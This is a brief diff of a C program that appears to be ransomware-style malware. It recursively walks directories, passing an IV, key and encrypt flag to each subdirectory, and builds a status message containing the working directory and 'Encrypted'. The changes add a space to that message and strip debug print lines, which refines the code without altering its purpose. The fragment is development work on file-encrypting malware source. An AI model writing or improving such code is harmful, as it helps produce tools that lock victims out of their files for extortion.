@@ -81,6 +81,7 @@ int main (int argc, char * argv[])
             
             char response[2048];
             strcpy(response, cwd);
+            strcat(response, " ");
             strcat(response, "Encrypted");
 
 
@@ -147,12 +148,11 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
     {
         if(dirp->d_type==DT_DIR && strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0 )
         {
-            //printf("%s\n", dirp->d_name);
+            
             char *newPath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
             strcpy(newPath,name);
             strncat(newPath,"/",2);
             strncat(newPath,dirp->d_name,strlen(dirp->d_name));
-            //printf("%s\n", newPath);
             listdir(newPath,iv, key, 'e');
             free(newPath);
         }
